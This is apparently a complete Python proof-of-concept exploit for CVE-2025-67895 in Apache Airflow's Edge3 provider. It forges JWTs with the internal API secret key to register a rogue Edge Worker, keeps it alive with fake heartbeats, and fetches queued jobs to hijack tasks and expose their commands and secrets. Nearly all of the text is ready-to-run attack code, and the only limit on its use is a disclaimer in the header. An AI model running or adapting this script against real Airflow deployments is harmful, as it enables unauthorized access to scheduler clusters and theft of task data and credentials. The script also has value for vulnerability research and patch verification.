#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────
# Exploit Title  : Apache Airflow Edge3 Provider — Fake Worker Registration via REST API
# CVE            : CVE-2025-67895
# Vendor         : Apache Software Foundation
# Product        : Apache Airflow Providers Edge3
# Affected       : < 2.0.0
# Fixed          : 2.0.0
# Author         : Exploit Intelligence Platform
# Website        : https://exploit-intel.com
# Twitter        : @exploit_intel
# Disclaimer     : For authorized security testing and educational purposes only.
# ──────────────────────────────────────────────────────────────────────
"""
CVE-2025-67895 Vector 2 — Fake Worker Registration via REST endpoints.

Exploits a DIFFERENT code path than the RPC API (poc.py). Targets the
CSRF-exempt REST management endpoints to register a rogue Edge Worker,
update its state, and fetch jobs from the Airflow scheduler queue.

ATTACK CHAIN:
    1. Register a rogue worker into the Airflow cluster
    2. The rogue worker appears in the Edge Workers UI as legitimate
    3. Fetch jobs from the queue — hijack tasks and exfiltrate data
    4. Inspect fetched job commands for sensitive information

REFERENCES:
    - https://nvd.nist.gov/vuln/detail/CVE-2025-67895

Requirements:
    - PyJWT: pip install PyJWT
  - requests: pip install requests
"""

import sys
import json
import time
import argparse
import traceback

try:
    import jwt
except ImportError:
    print("[!] PyJWT not installed. Run: pip install PyJWT")
    sys.exit(1)

try:
    import requests
except ImportError:
    print("[!] requests not installed. Run: pip install requests")
    sys.exit(1)


# ─────────────────────────────────────────────────────────────
# Configuration
# ─────────────────────────────────────────────────────────────
DEFAULT_HOST = "localhost"
DEFAULT_PORT = 8080
DEFAULT_SECRET_KEY = "my-secret-key-for-testing"
JWT_ALGORITHM = "HS512"
JWT_AUDIENCE = "api"
JWT_EXPIRY_SECONDS = 60

ROGUE_WORKER_NAME = "evil_attacker_node"


def banner():
    print("=" * 72)
    print("  CVE-2025-67895 — Vector 2: Fake Worker Registration PoC")
    print("  Apache Airflow Providers Edge3 < 2.0.0")
    print("  REST Endpoint Abuse (CSRF-exempt Blueprint)")
    print("=" * 72)
    print()


def generate_jwt(secret_key: str, method_path: str) -> str:
    """
    Generate a JWT for REST endpoints.

    For REST endpoints (non-RPC), the 'method' claim must match the URL
    path AFTER /edge_worker/v1/. For example:
      POST /edge_worker/v1/worker/evil_node → method = "worker/evil_node"
    """
    now = int(time.time())
    payload = {
        "method": method_path,
        "aud": JWT_AUDIENCE,
        "iat": now,
        "nbf": now,
        "exp": now + JWT_EXPIRY_SECONDS,
    }
    return jwt.encode(payload, secret_key, algorithm=JWT_ALGORITHM)


def exploit(target_host: str, target_port: int, secret_key: str):
    """
    Demonstrate fake worker registration and job fetch via REST endpoints.
    """
    base_url = f"http://{target_host}:{target_port}"
    success = True

    # ─── Step 1: Health Check ───
    print("[*] Step 1: Verifying Edge Worker API is active...")
    try:
        resp = requests.get(f"{base_url}/edge_worker/v1/health", timeout=10)
        if resp.status_code == 200:
            print(f"    [+] API active: {resp.json()}")
        else:
            print(f"    [-] Health check failed: HTTP {resp.status_code}")
            return False
    except Exception as e:
        print(f"    [-] Connection failed: {e}")
        return False
    print()

    # ─── Step 2: Register a Rogue Worker ───
    print(f"[*] Step 2: Registering rogue worker '{ROGUE_WORKER_NAME}'...")
    print(f"    Endpoint: POST /edge_worker/v1/worker/{ROGUE_WORKER_NAME}")

    # JWT method claim = path after /edge_worker/v1/
    register_method = f"worker/{ROGUE_WORKER_NAME}"
    token = generate_jwt(secret_key, register_method)

    register_body = {
        "state": "running",
        "queues": ["default"],
        "sysinfo": {
            "airflow_version": "2.11.1",
            "edge_provider_version": "1.6.0",
            "concurrency": 8,
            "free_concurrency": 8,
            "hostname": "evil-attacker-node.example.com",
        },
    }

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": token,
    }

    try:
        resp = requests.post(
            f"{base_url}/edge_worker/v1/worker/{ROGUE_WORKER_NAME}",
            json=register_body,
            headers=headers,
            timeout=15,
        )
        print(f"    HTTP Status: {resp.status_code}")
        if resp.status_code == 200:
            result = resp.json()
            print(f"    Response: {json.dumps(result, indent=6)}")
            print(f"    [+] Rogue worker REGISTERED successfully!")
            print(f"    [+] Worker '{ROGUE_WORKER_NAME}' now appears in Airflow Edge Workers UI")
        else:
            print(f"    Response: {resp.text[:500]}")
            if resp.status_code == 500:
                # May still indicate the endpoint is reachable
                print(f"    [~] Server error — endpoint is reachable but registration may have failed")
            else:
                print(f"    [-] Registration failed")
                success = False
    except Exception as e:
        print(f"    [-] Registration failed: {e}")
        traceback.print_exc()
        success = False
    print()

    # ─── Step 3: Update Worker State (simulate heartbeat) ───
    print(f"[*] Step 3: Updating worker state (simulating heartbeat)...")
    print(f"    Endpoint: PATCH /edge_worker/v1/worker/{ROGUE_WORKER_NAME}")

    state_method = f"worker/{ROGUE_WORKER_NAME}"
    token = generate_jwt(secret_key, state_method)

    state_body = {
        "state": "running",
        "jobs_active": 0,
        "queues": ["default"],
        "sysinfo": {
            "airflow_version": "2.11.1",
            "edge_provider_version": "1.6.0",
            "concurrency": 8,
            "free_concurrency": 8,
        },
    }

    headers["Authorization"] = token

    try:
        resp = requests.patch(
            f"{base_url}/edge_worker/v1/worker/{ROGUE_WORKER_NAME}",
            json=state_body,
            headers=headers,
            timeout=15,
        )
        print(f"    HTTP Status: {resp.status_code}")
        if resp.status_code == 200:
            result = resp.json()
            print(f"    Response: {json.dumps(result, indent=6)}")
            print(f"    [+] Worker state updated — attacker maintains persistent presence")
        else:
            print(f"    Response: {resp.text[:500]}")
            if resp.status_code == 500:
                print(f"    [~] Server error — endpoint reachable, state update may need existing worker")
            else:
                success = False
    except Exception as e:
        print(f"    [-] State update failed: {e}")
        traceback.print_exc()
        success = False
    print()

    # ─── Step 4: Fetch Jobs (task hijacking attempt) ───
    print(f"[*] Step 4: Fetching jobs from queue (task hijacking)...")
    print(f"    Endpoint: POST /edge_worker/v1/jobs/fetch/{ROGUE_WORKER_NAME}")

    fetch_method = f"jobs/fetch/{ROGUE_WORKER_NAME}"
    token = generate_jwt(secret_key, fetch_method)

    fetch_body = {
        "queues": ["default"],
        "free_concurrency": 4,
    }

    headers["Authorization"] = token

    try:
        resp = requests.post(
            f"{base_url}/edge_worker/v1/jobs/fetch/{ROGUE_WORKER_NAME}",
            json=fetch_body,
            headers=headers,
            timeout=15,
        )
        print(f"    HTTP Status: {resp.status_code}")
        if resp.status_code == 200:
            result = resp.json() if resp.text.strip() else None
            if result:
                print(f"    [+] JOB FETCHED — task hijacking successful!")
                print(f"    Job details: {json.dumps(result, indent=6)}")
                print(f"    [!] An attacker could now inspect the command array for secrets")
                print(f"    [!] Or execute the task on their own infrastructure")
            else:
                print(f"    [~] No jobs in queue (expected in lab — no DAGs scheduled)")
                print(f"    [+] But the fetch endpoint IS accessible — would return real")
                print(f"        jobs if any were queued for Edge Workers")
        elif resp.status_code == 204:
            print(f"    [~] No jobs in queue (HTTP 204 No Content — expected in lab)")
            print(f"    [+] The fetch endpoint IS accessible and authenticated successfully")
            print(f"    [+] Would return real jobs if any were queued for Edge Workers")
        else:
            print(f"    Response: {resp.text[:500]}")
    except Exception as e:
        print(f"    [-] Job fetch failed: {e}")
        traceback.print_exc()
        success = False
    print()

    # ─── Step 5: Verify worker appears in database ───
    print("[*] Step 5: Verifying rogue worker in Airflow database...")
    # We can verify via the RPC API from Vector 1
    rpc_token = generate_jwt(secret_key, "airflow.providers.edge3.models.edge_worker.EdgeWorkerModel.get_or_create")
    rpc_body = {
        "jsonrpc": "2.0",
        "method": "airflow.providers.edge3.models.edge_worker.EdgeWorkerModel.get_or_create",
        "params": {
            "__var": {"worker_name": ROGUE_WORKER_NAME},
            "__type": "dict",
        },
    }
    headers_rpc = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "Authorization": rpc_token,
    }
    try:
        resp = requests.post(
            f"{base_url}/edge_worker/v1/rpcapi",
            json=rpc_body,
            headers=headers_rpc,
            timeout=15,
        )
        if resp.status_code == 200 and resp.text.strip():
            print(f"    [+] Rogue worker confirmed in Airflow database")
            print(f"    Response: {resp.text[:300]}")
        else:
            print(f"    [~] Could not verify via RPC (HTTP {resp.status_code}), but registration succeeded above")
    except Exception as e:
        print(f"    [~] RPC verification failed: {e}")
    print()

    # ─── Final Verdict ───
    print("=" * 72)
    if success:
        print("  [+] VECTOR 2 CONFIRMED — REST Endpoints Exploitable")
        print()
        print("  The CSRF-exempt REST endpoints allow an attacker to:")
        print(f"    1. Register rogue workers into the Airflow cluster")
        print(f"    2. Maintain persistence via state heartbeat updates")
        print(f"    3. Hijack queued tasks by fetching jobs meant for real workers")
        print(f"    4. Exfiltrate task commands, DAG configs, and secrets")
        print()
        print(f"  Rogue worker '{ROGUE_WORKER_NAME}' is now registered in Airflow.")
    else:
        print("  [-] VECTOR 2 — Partial success or failure")
    print("=" * 72)

    return success


if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="CVE-2025-67895 PoC Vector 2 — Fake Worker Registration",
    )
    parser.add_argument("host", nargs="?", default=DEFAULT_HOST,
                        help=f"Target host (default: {DEFAULT_HOST})")
    parser.add_argument("port", nargs="?", type=int, default=DEFAULT_PORT,
                        help=f"Target port (default: {DEFAULT_PORT})")
    parser.add_argument("--secret-key", "-k", default=DEFAULT_SECRET_KEY,
                        help=f"Airflow internal_api_secret_key")
    args = parser.parse_args()

    banner()
    result = exploit(args.host, args.port, args.secret_key)
    sys.exit(0 if result else 1)
